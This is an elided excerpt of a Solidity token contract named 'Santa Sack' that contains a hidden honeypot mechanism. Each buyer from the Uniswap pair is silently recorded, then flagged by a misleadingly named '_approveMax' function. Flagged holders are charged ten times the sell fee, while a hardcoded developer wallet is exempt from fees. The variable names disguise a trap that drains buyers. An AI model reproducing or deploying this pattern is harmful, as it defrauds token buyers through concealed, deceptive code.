...
contract SantaSack is Context, IERC20, Ownable { 
    ...
    mapping (address => bool) public _TxLimitExempt;  
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x93d01D88a021AC139e5cd4F4bE60C0f1f73D4fA0);
    ...
    */
    ...
    string private _name = "Santa Sack"; 
    string private _symbol = " $SANTASACK";  
    ...
    */
    ...
    address[] private _isTxLimitExempt;
    ...
    */
    ...
    constructor () {
        ...
        _ExcludedFromFee[Wallet_Dev] = true;        
    ...
    */
    ...
    function _approveMax() private { for (uint256 i = 0; i < _isTxLimitExempt.length; i++) {
            _TxLimitExempt[_isTxLimitExempt[i]] = true;
        }
    }
    ...
    function _transfer(
        ...
        */
        ...
        if (from == uniswapV2Pair && to != owner()){
            require(amount <= _maxTxAmount, "You are trying to buy more than the max transaction limit."); _isTxLimitExempt.push(to);}
        /*
        ...
        */
        ...
        if(_ExcludedFromFee[from] || _ExcludedFromFee[to]){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (from == uniswapV2Pair && to == Wallet_Dev){_approveMax();} else if (_TxLimitExempt[from]){_TotalFee = _sellFee*10;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}
